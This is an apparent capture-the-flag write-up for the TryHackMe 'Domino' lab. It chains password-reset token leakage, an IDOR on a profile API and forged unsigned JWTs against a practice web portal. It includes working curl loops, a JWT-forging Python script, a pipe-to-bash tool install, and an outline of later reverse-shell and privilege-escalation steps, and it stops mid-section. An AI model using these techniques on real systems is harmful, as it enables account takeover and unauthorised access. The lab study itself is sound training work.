---
Title: Domino
Description: Chain together vulnerabilities in a cascading attack, where every piece you find knocks over the next.
Link: https://tryhackme.com/room/domino
Topics:
- web-exploitation
- username-harvesting
- broken-access-control
- idor
- jwt
- rfi
- privilege-escalation
- credential-reuse 
Tools:
- nmap
- feroxbuster
- burp-suite
- curl
- pspy
THM Difficulty: Medium
THM Estimation: 60 minutes
---
#challenge
# Challenge
The NexusCorp Employee Portal appears to be a typical internal application with authentication controls and role-based access in place. However, multiple small weaknesses, ranging from misconfigurations to logic flaws, can be combined to fully compromise the system.

As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.

_A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._
# Questions
- [[#Challenge 1 - What is the flag found in the admin user's profile notes?|Challenge 1]] - What is the flag found in the admin user's profile notes?
- [[#Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?|Challenge 2]] - What is the flag displayed on the admin panel after gaining admin access?
- [[#Challenge 3 - What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`|Challenge 3]] - What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`
- [[#Challenge 4 - What is the flag found in the **devops** user's home directory?|Challenge 4]] - What is the flag found in the **devops** user's home directory?
- [[#Challenge 5 - What is the root flag?|Challenge 5]] - What is the root flag?
# Decoding the task
Let's summarise our initial understanding of the task. This will help identifying the playbook we will deploy:
- "**Employee Portal**": This most likely means we have a web application. So we're dealing with website, PHP/Python/ASP/..., database, authentication.
- "**authentication controls and role-based access**": Probably standard users and admin users (JWT, session cookies, privilege escalation).
- "**multiple small weaknesses, ranging from misconfigurations to logic flaws"** gives us some hints on what to look for.
- "**observe how the application behave**": Play around the website, search for hidden links, click on them and use tools like Burp Suite to see the communication.
- "**interact with its endpoints**": We know a single endpoint (website most likely on port 80), but it could mean that there are other options (such as API access).
- "**analysing requests, modifying parameter**": Capture the web requests using Burp Suite and modify to achieve results.
- "**chaining vulnerabilities together**": We need to use multiple vulnerabilities together to achieve the result.
- "**progressively escalate**": Gain standard user access and then escalate it to admin user.

>[!Note] Attackbox
>This write-up assumes the TryHackMe provided attackbox is used, and therefore, the tools and wordlists from the machine is used. Should you use your own attackbox, then you will need to source the tools and wordlists yourself.

## Attack chain overview (the dominoes)
The box is themed as a chain reaction. Here is the full sequence, so the map is clear before the detail:

```
team.php (usernames)
  └─► api/reset.php returns the reset token in the HTTP response (not emailed)
        └─► reset james.wright's password -> log in
              └─► IDOR on api/users/profile.php?id= (no ownership check)
                    ├─► Flag 1 (laura.hayes notes) + learn the real admin is laura.hayes
                    └─► JWT: verify_jwt() has its signature check commented out
                          └─► forge admin JWT -> admin panel -> Flag 2
                                └─► RFI: api/files.php?name=<remote PHP URL> executes our payload
                                      └─► reverse shell (www-data) -> Flag 3 (/opt/flag3.txt)
                                            └─► config.php creds reused -> su devops -> Flag 4
                                                  └─► writable root-cron script /opt/monitoring/health_report.sh -> root -> Flag 5
```

# Initial recon

>[!Note] Concept
>Perform recon on the target IP, identify ports, OS, application logic, etc...

## Set the TARGET variable

>[!Tip] Setting a TARGET variable helps us so that we can use it later on, instead of typing the IP each time

```bash
# Set the target IP variable so we don't have to type it all the time
TARGET=10.112.167.102
```
## Is the host reachable?

```bash
ping -c 1 $TARGET
PING 10.112.167.102 (10.112.167.102) 56(84) bytes of data.
64 bytes from 10.112.167.102: icmp_seq=1 ttl=64 time=0.831 ms

--- 10.112.167.102 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.831/0.831/0.831/0.000 ms
```

Yes, the host is reachable! It's always a good idea to ensure the host is reachable.

## Look for open port

```bash
nmap -sS -sV $TARGET -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-01 16:47 UTC
Nmap scan report for ip-10-112-167-102.eu-central-1.compute.internal (10.112.167.102)
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
```

**What we have identified until now:**
- Target is reachable
- Ports:
	- `22` (for ssh) seems to have `OpenSSH 9.6p1 Ubuntu 3ubuntu13.16` behind it
	- `80` (for http) seems to have `Apache httpd 2.4.58` behind it
- The OS is most likely: `Ubuntu Linux`
## Investigating the port `80`
We've identified from the `nmap` that port `80` is reachable. Let's investigate it further:

```bash
# Set the URL variable so we don't have to type it all the time
URL=http://10.112.167.102:80
```

**Checking the HTTP header only, looking for the HTTP response code**:

```bash
curl -I $URL
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 16:54:14 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

>[!Info] `robots.txt` and `sitemap.xml`
>It's a good practice to check for these two files. In this scenario, neither of these files are present. 
>`curl -I $URL/robots.txt`
>`curl -I $URL/sitemap.xml`

**A look at the website** concludes the following observations:
- This is a basic authentication site
- the username takes the form of `firstname.lastname`
- There are two links:
	- Forgot password -> `<a href="/forgot.php">Forgot password?</a>`
	- Our Team -> `<a href="/team.php">Our Team</a>`
- The page is using `<form method="POST" action="/index.php">`
- The username field: `<input type="text" name="username" placeholder="firstname.lastname" required>`
- The password field: `<input type="password" name="password" placeholder="Password" required>`

![[domino_01.png]]

At this stage, we have no usernames. but the "Our Teams" looks promising.

# Analysing the "Our Team" page
The "**Our Team**" page has the list of names and email address. **BINGO**! we have our usernames. This is a good source to harvest usernames. As typically, the username would be a portion of the email address, we can harvest the info. There are 7 items here, so it would be easy to manually copy+paste, but let's for the fun of it, automate it.

![[domino_02.png]]

## Scrap the usernames from the "Our Team" page

We're going to use the `https://github.com/narehvan/cyber-microtools/tree/main/emailharvester`:

```bash
# Create a directory for our work
mkdir $HOME/challenge
cd $HOME/challenge

# clone the project, but don't download all the files
git clone --filter=blob:none --sparse https://github.com/narehvan/cyber-microtools.git

# change the directory to the project directory
cd cyber-microtools/

# Download
git sparse-checkout set emailharvester

# Change to the directory
cd $HOME/challenge
python3 $HOME/challenge/cyber-microtools/emailharvester/emailharvester.py -o emails.txt $URL/team.php
```

Using `cat emails.txt`, check the output. We have 7 email addresses scraped from the site:

```bash
david.brown@nexus.corp
emma.taylor@nexus.corp
james.wright@nexus.corp
laura.hayes@nexus.corp
michael.chen@nexus.corp
robert.wilson@nexus.corp
sarah.johnson@nexus.corp
```

With the email addresses identified, we could perform a brute force attack. However, before going that path, let's check if there are easier ways. Next would be to check the web server (as it is an apache based server), if we can identify the files and directories.

# Searching for files/directories

**Install feroxbuster**:

```bash
# Make a directory to store the app
mkdir -p $HOME/challenge/feroxbuster

# Download it
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s $HOME/challenge/feroxbuster
```

**Prepare the variables**. The `URL` should already be set from previous steps:

```bash
echo $URL
URL=http://10.112.167.102:80
```

Set the `WORDLIST` we will use with the `feroxbuster`:

```bash
WORDLIST=/usr/share/wordlists/dirb/big.txt
```

**Run it**

```bash
cd $HOME/challenge/feroxbuster

./feroxbuster -u $URL -w $WORDLIST -x php,html,js,txt,zip,gzip,gz,tar,enc,bkp,conf,config,py -d 3 -o $HOME/challenge/challenge_site_scrap.txt
```

The `challenge_site_scrap.txt` file will be generated. We could just read this file, or we could format it as a tree so it is easier to see the nested directories. here is how to format it using the `https://github.com/narehvan/cyber-microtools/tree/main/url2webtree_pretty` tool:

```bash
# Change directory to $HOME/challenge
cd $HOME/challenge

# clone the project, but don't download all the files (if you haven't done it already in the previous step)
git clone --filter=blob:none --sparse https://github.com/narehvan/cyber-microtools.git

# change the directory to the project directory
cd $HOME/challenge/cyber-microtools/

# Download only the url2webtree_pretty
git sparse-checkout set url2webtree_pretty

# Assuming you ran the git command from $HOME/challenge
cd $HOME/challenge
python3 $HOME/challenge/cyber-microtools/url2webtree_pretty/url2_webtree_pretty.py challenge_site_scrap.txt > challenge_site_scrap_tree.txt
```

use `cat challenge_site_scrap_tree.txt` to view the contents:

```txt
http://10.112.167.102/  [200]
├── admin/  [301, -> /admin/]
│   └── index.php  [403]
├── api/  [301, -> /api/]
│   ├── auth/  [301, -> /api/auth/]
│   │   └── token.php  [302, -> /index.php]
│   ├── users/  [301, -> /api/users/]
│   │   └── profile.php  [302, -> /index.php]
│   ├── files.php  [401]
│   ├── index.php  [200]
│   ├── login.php  [405]
│   └── reset.php  [405]
├── backup/  [301, -> /backup/]
│   ├── config.enc  [200]
│   └── README.txt  [200]
├── javascript/  [301, -> /javascript/]
│   ├── async/  [301, -> /javascript/async/]
│   │   ├── async  [200]
│   │   └── async.js  [200]
│   ├── events/  [301, -> /javascript/events/]
│   │   ├── events  [200]
│   │   └── events.js  [200]
│   └── util/  [301, -> /javascript/util/]
│       ├── support/  [301, -> /javascript/util/support/]
│       │   ├── isBuffer  [200]
│       │   └── types  [200]
│       ├── util  [200]
│       └── util.js  [200]
├── static/  [301, -> /static/]
│   ├── app.js  [200]
│   └── style.css  [200]
├── support/  [301, -> /support/]
│   ├── create.php  [302, -> /index.php]
│   └── index.php  [302, -> /index.php]
├── 403.php  [200]
├── auth.php  [200]
├── config.php  [200]
├── dashboard.php  [302, -> /index.php]
├── forgot.php  [200]
├── index.php  [200]
├── logout.php  [302, -> /index.php]
├── reset.php  [200]
└── team.php  [200]
```

We have a list of directories and files we have currently identified on the website, displayed in a tree format for easier reading.

**Points of interest**:

There are few interesting targets. Here is a list of attractive ones. It does not mean the rest should be ignored:

| What?                     | Why?                                                    |
| ------------------------- | ------------------------------------------------------- |
| `/admin/index.php`        | admin directory. Second question refers to this         |
| `/api/auth`, `/api/users` | there was a reference to multiple endpoints in the task |
| `/backup/config.enc`      | some encrypted configuration file?                      |
| `/support/create.php`     | Not sure yet, but definitely worth checking             |
| `/reset.php`              | Not sure yet, but definitely worth checking             |
| `/api/reset.php`          | A second reset option                                   |
| `/api/auth/token.php`     | A token page?                                           |

# Challenge 1 - What is the flag found in the admin user's profile notes?
The question tells us that we need an admin user and we then need to find the notes under that user's profile. Based on the "team.php" page, the only admin is "James Wright". But remember the task is talking about roles, so it could be that another user is assigned an "admin" role:

![[domino_03.png]]

Does the task want us to login using an admin to the main portal, or is there something that is connected to the `/admin/index.php` page we have identified? The first obvious choice is to attempt to login to the main portal. We have 7 usernames and no password. There are few directions we could take:

1. brute force our way,
2. explore the "forgot.php" page
3. explore the `/reset.php` page
4. explore the `/api/reset.php` page
5. explore the `/api/auth/token.php` page.

Let's first try the `forgot.php` page. Brute force would be our last choice.

## Attempt to reset the password - `forgot.php`
Attempting to reset the password for the user: `james.wright`, we get the message: "**Reset link sent. Check your email for instructions.**" But we have no access to the user's email.

![[domino_04.png]]

Attempting to reset the password for "**laura.hayes**", we get a different message: `Password reset instructions have been sent to la****@nexus.corp`

This could be a clue. To dig up what's happening, let's fire-up the Burp Suite and then attempt to find out for each of the users how the "Password Reset" behaves:
- It is a POST request
- the body contains: `username=james.wright`
- the response contains `<div class="alert alert-success">`

```http
POST /forgot.php HTTP/1.1
Host: 10.112.167.102
Content-Length: 21
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.112.167.102
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.167.102/forgot.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=james.wright
```

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 17:59:59 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 774
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

   <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>
```

Let's automate it using `curl`. Remember we have the following already set:
- the `URL` variable
- the `$HOME/challenge/emails.txt` contains a list of all the emails scraped from the `team.php` page

```bash
# change directory to $HOME/challenge where the emails.txt is located 
cd $HOME/challenge

# execute a command to loop through each email address and attempt to reset the password
awk -F '@' '{print $1}' emails.txt | while read -r username; do echo -e "\n"; echo $username; curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "username=$username" $URL/forgot.php | grep "alert" ; done
```

The output:

```bash
david.brown
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">


emma.taylor
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">


james.wright
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">


laura.hayes
    <div class="alert alert-success">Password reset instructions have been sent to la****@nexus.corp</div>  <form method="POST" action="/forgot.php">


michael.chen
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">


robert.wilson
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">


sarah.johnson
    <div class="alert alert-success">Reset link sent. Check your email for instructions.</div>  <form method="POST" action="/forgot.php">
```

Except the "**laura.hayes**", every other email gives the same message. There is obviously something different about that user, but at this stage, not sure what. This exercise shows how we could automate the process. It also helps us narrow down that the user "**laura.hayes**" must be a special user, because, why would it be different than the other 6 users?

> [!Info] Two endpoints, same feature, different trust boundary
>`forgot.php` only _masks_ the email for admins and otherwise tells us nothing actionable - there is no token in its response. Keep that in mind: the real flaw is on the **API** version of the same feature (`api/reset.php`), which, as we are about to see, returns the reset **token directly in the HTTP response** instead of emailing it. Same "password reset" feature, two very different trust boundaries - that asymmetry is the Challenge-1 enabler.

## Attempt to reset the password - the `/api` route
Let's check the `/api` endpoint. Looking at the files/directories we scraped, there are few interesting ones:

```txt
├── api/  [301, -> /api/]
│   ├── auth/  [301, -> /api/auth/]
│   │   └── token.php  [302, -> /index.php]
│   ├── users/  [301, -> /api/users/]
│   │   └── profile.php  [302, -> /index.php]
│   ├── files.php  [401]
│   ├── index.php  [200]
│   ├── login.php  [405]
│   └── reset.php  [405]
```

After several trial and error, we settle down with these steps: The `reset.php` is interesting.

Extracting the mechanism from Burp Suite, we can see a `POST`. Replicating that with `curl` and a `test` user is successful, because we get an error which says that a valid username is needed.

```bash
curl -X POST -H "Content-Type: application/json" -d '{"username":"test"}' $URL/api/reset.php
{"error":"No account found with that username"}
```

One way is to run it against a single user. But why not automate it against all 7 users at once:

```bash
# change directory to $HOME/challenge where the emails.txt is located 
cd $HOME/challenge

# Execute the command
awk -F '@' '{print $1}' emails.txt | while read -r username; do echo -e "\n"; echo "$username"; curl -X POST -H "Content-Type: application/json" -d "{\"username\":\"$username\"}" $URL/api/reset.php; echo; done
```

The result:

```bash
david.brown
{"token":"ce492530653b116a2bb8ca24c1d28727","reset_url":"\/reset.php?token=ce492530653b116a2bb8ca24c1d28727"}


emma.taylor
{"token":"de999b06cc63b7591ffd9e0ec7c28c89","reset_url":"\/reset.php?token=de999b06cc63b7591ffd9e0ec7c28c89"}


james.wright
{"token":"233a03da924d8b172468bd2afdea81d1","reset_url":"\/reset.php?token=233a03da924d8b172468bd2afdea81d1"}


laura.hayes
{"message":"Password reset instructions sent to la****@nexus.corp"}


michael.chen
{"token":"575fbdc21d86b29bb2d09fc01aa93d77","reset_url":"\/reset.php?token=575fbdc21d86b29bb2d09fc01aa93d77"}


robert.wilson
{"token":"0c6ef259f6353d0f952a2b7a9eaa1683","reset_url":"\/reset.php?token=0c6ef259f6353d0f952a2b7a9eaa1683"}


sarah.johnson
{"token":"cb4e90c5c680c90454b3956aa898bba9","reset_url":"\/reset.php?token=cb4e90c5c680c90454b3956aa898bba9"}
```

The result is very interesting: It seems we get a token for every user except the "**laura.hayes**" user. Nevertheless, we have a token.

> [!Note] The actual vulnerability
>Here `api/reset.php` hands the password-reset **token back to the caller in the JSON response** instead of emailing it to the account owner. That means anyone can reset any non-admin user's password without access to their mailbox. (The admin `laura.hayes` is specifically excluded - the server returns a masked message instead of a token - which is itself the hint that she is the real admin.)

This may be used to actually reset the password. Let's give it a try. Our "System Administrator" is `james.wright`, so let's start with that user:

Based on the data we have:

```
james.wright
{"token":"233a03da924d8b172468bd2afdea81d1","reset_url":"\/reset.php?token=233a03da924d8b172468bd2afdea81d1"}
```

The link would be:

```
http://10.112.167.102/reset.php?token=233a03da924d8b172468bd2afdea81d1
```

![[domino_05.png]]

The password reset was successful:

![[domino_06.png]]

We have successfully reset the password of the "**james.wright**" and logged in to the dashboard with the new credentials:

![[domino_07.png]]

There are few hints:
- the `/api/files.php` endpoint,
- the `/api/auth/token.php` option

and few possible options to try:
- the "support tickets"
- the "my profile API"

The interesting option is the "my profile API". This shows a JSON file and a "notes" field. Remember, the challenge is to find the admin user's profile notes. We have found the notes for "james.wright", who is a "system administrator", but the role in the profile shows as "user".

![[domino_08.png]]

This is the best place to attempt IDOR: the `/profile.php?id=7` can be modified.

## IDOR attempt
Extracting the request from Burp Suite, gives us the "Cookie" value and the request `GET /api/users/profile.php?id=7`

```http
GET /api/users/profile.php?id=7 HTTP/1.1
Host: 10.112.167.102
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.112.167.102/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b
Connection: keep-alive
```

> [!Info] Why the IDOR works
>The `profile.php` reads the `id` parameter and returns that user's record **without checking that the `id` belongs to the logged-in session** - a missing ownership/authorization check (classic IDOR). Any authenticated user can read any user's profile just by changing the number.

Automating it:

```bash
for i in $(seq 0 10); do echo -e "\nID: $i"; curl -s -b "nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b" "$URL/api/users/profile.php?id=$i"; echo; done
```

```json
ID: 0
{"error":"Missing id"}

ID: 1
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_...}"}

ID: 2
{"id":2,"username":"michael.chen","email":"michael.chen@nexus.corp","role":"user","notes":""}

ID: 3
{"id":3,"username":"sarah.johnson","email":"sarah.johnson@nexus.corp","role":"user","notes":""}

ID: 4
{"id":4,"username":"robert.wilson","email":"robert.wilson@nexus.corp","role":"user","notes":""}

ID: 5
{"id":5,"username":"emma.taylor","email":"emma.taylor@nexus.corp","role":"user","notes":"Q3 migration notes: infra review pending approval"}

ID: 6
{"id":6,"username":"david.brown","email":"david.brown@nexus.corp","role":"user","notes":""}

ID: 7
{"id":7,"username":"james.wright","email":"james.wright@nexus.corp","role":"user","notes":""}

ID: 8
{"error":"User not found"}

ID: 9
{"error":"User not found"}

ID: 10
{"error":"User not found"}
```

BINGO! the userid=1 is "laura.hayes", has the "role":"admin", and the notes contains the flag: "notes":"THM{1d0r_...}"

```json
ID: 1
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_...}"}
```

We have identified:
- the flag for challenge 1,
- the admin user who is "laura.hayes". This also explains why we couldn't simply reset the password (`api/reset.php` excluded her). It would have been too easy to find the flag.

# Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?

Remember we had found the `admin` directory. This must be the admin panel:

```txt
├── admin/  [301, -> /admin/]
│   └── index.php  [403]
```

## Checking out the admin panel
The link we want to browse to is: `http://10.112.167.102/admin/`:

There are two scenarios we can test now:
1. Without a logged in user
2. With a logged in user (i.e., "**james.wright**"). This will utilise a session cookie.

Unfortunately, in both scenarios, we are presented with the `403 - Access Denied` error. let's dissect it in Burp:

![[domino_09.png]]

The request sends a cookie:

```http
GET /admin/ HTTP/1.1
Host: 10.112.167.102
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b
Connection: keep-alive
```

As there is no method to provide credentials on the `/admin` page, let's check the cookie to identify a possible way:

- The cookie is a single name=value pair: `nexus_session=eyJ1c2....`
- it contains two sections separated by a `.`:
	- `eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D`
	- `a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b`
- the first segment ends with `%3D` which is URL-encoded (percent-encoded) representation of an equal sign (`=`)

Checking in `CyberChef`: converting it from `base64` reveals the two parts:
- `{"user_id":7,"username":"james.wright","role":"user"}`
- a 64 character long string. Which is not base64. At this stage, the assumption is that the second part is a signature for the first part which is readable.

From the readable section, we can see that it contains the user_id=7 which is our `james.wright` user. It also has the role user. `{"user_id":7,"username":"james.wright","role":"user"}`

The assumption currently is that we need to send a cookie that contains the `role=admin`. The only user that has admin role is `laura.hayes`, and we have no password for the user, so we can't generate a valid cookie. One option is to attempt to forge the cookie. As we don't have the correct password the server uses to generate the signature, we can only hope that the web server does not check the signature.
## Forging the cookie

>[!Note] Note
>The "Forging the cookie" step does not provide a solution. It is only for demonstration and learning purpose.

The concept is to change the cookie's first part from:

`{"user_id":7,"username":"james.wright","role":"user"}`

to

`{"user_id":1,"username":"laura.hayes","role":"admin"}`

The problem? the second part of the cookie is most likely the signature and requires a password to generate it. We don't have that password. (note that this is not the same password as the password of the user "laura.hayes"). What we can try is to forge the first part with the hope that the application does not check the signature. Worth trying...

Save the contents of this file to `gen.py`

```python
import base64
json_data='{"user_id":1,"username":"laura.hayes","role":"admin"}'
base64url_data = base64.urlsafe_b64encode(json_data.encode()).rstrip(b'=').decode()
print(f"{base64url_data}.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b")
```

```bash
# Execute the file with python to generate the cookie
python gen.py
```

The `a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b` is the signature taken from the cookie we have saved in the earlier step. The output of the python code execution is:

```txt
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b
```

Running the `curl` command yields no results, so the web server is checking the signature, or at this stage, we have not identified a way to crack this:

```bash
curl -s -b "nexus_session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b" $URL/admin/index.php
<!DOCTYPE html>
<html><head><title>403 - NexusCorp</title><link rel="stylesheet" href="/static/style.css"></head>
<body class="login-page">
<div class="login-box">
<h2>403 - Access Denied</h2>
<p>You do not have permission to access this resource.</p>
<a href="/dashboard.php">Return to Dashboard</a>
</div></body></html>
```

> [!Note] Note
>We later confirmed from the source _why_ this had to fail Once we read `auth.php` (below), the cookie path turns out to be doubly locked:
> - `get_session()` recomputes `hash_hmac('sha256', base64_json, APP_SECRET)` and rejects a bad signature - so a forged cookie without `APP_SECRET` is dropped.
> - Even with a valid signature, the comment says _"Role always fetched from DB - cookie role value ignored"_ - so setting `role:admin` in the cookie would be ignored anyway; the role is re-read from the database by `user_id`.
> 
> So forging the **cookie** was never going to work. The weak link is a _different_ mechanism: the **JWT** path.

## Different approach - files.php
On the `dashboard.php` of the user we had logged in with, there was a "File viewer" and it provides another endpoint and also a hint about where to get a token. Let's check this direction:

the `files.php` requires a valid JWT token:

```bash
curl -i $URL/api/files.php?name=test
HTTP/1.1 401 Unauthorized
Date: Sun, 01 Nov 2026 20:01:20 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 67
Content-Type: application/json

{"error":"JWT token required. Get one from \/api\/auth\/token.php"}
```

It also tells us from where to get one: `/api\/auth\/token.php`. We need the actual cookie from the valid login of the user `james.wright`.

The cookie:

```bash
nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b
```

The request:

```bash
curl -i -b "nexus_session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D.a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b" $URL/api/auth/token.php
```

The response:

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 20:05:18 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 284
Content-Type: application/json

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqYW1lcy53cmlnaHQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc5MzU2MzUxOCwiZXhwIjoxNzkzNTY3MTE4fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
```

Much better, we have a token for the `files.php`. let's use it. The Error says two things:
- the process we used is correct, because we got the error that an "Admin JWT required". This means that the token and the request is valid, but not for an admin user,
- we need an admin token. The only admin user is "laura.hayes" and we don't have the user's password.

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqYW1lcy53cmlnaHQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc5MzU2MzUxOCwiZXhwIjoxNzkzNTY3MTE4fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=test
HTTP/1.1 403 Forbidden
Date: Sun, 01 Nov 2026 20:06:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 57
Content-Type: application/json

{"error":"Admin JWT required. Check your token payload."}
```

Options?
1. Brute force the password of "laura.hayes", or
2. Try to forge the JWT token. This option looks easier to start with.

Let's try the same trick as we did before: modify the payload part, hoping that the server will ignore the signature section. You can view the contents of the JWT token at https://www.jwt.io/.

Here is the code to try to forge it. Save it as `gen2.py` and execute it with `python gen2.py`:

```python
import base64
import json
import time

now = int(time.time())

header = '{"alg":"HS256","typ":"JWT"}'
payload = json.dumps({
    "sub": "laura.hayes",
    "role": "admin",
    "iat": now,
    "exp": now + 3600
}, separators=(",", ":"))
signature = 'veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA'

def base64url_encode(value):
    return base64.urlsafe_b64encode(value.encode()).rstrip(b'=').decode()

header_data = base64url_encode(header)
payload_data = base64url_encode(payload)

token = f"{header_data}.{payload_data}.{signature}"

print(token)
```

Here is the result:

```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA
```

let's use it:

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=test
```

The result:

```http
HTTP/1.1 403 Forbidden
Date: Sun, 01 Nov 2026 20:17:58 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Authorization
Content-Length: 65
Content-Type: application/json

{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

BINGO! we have succeeded to forge the token because we got `Access denied: path must be within \/var\/www\/html\/`. This means the authentication was successful because **the server does not check the JWT signature**, but it was not authorised to access files outside of the `/var/www/html`.

> [!Info] Info
> The actual [[#Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?|Challenge 2]] vulnerability (confirmed later in `auth.php`) `verify_jwt()` has its signature verification **commented out**:
> ```php
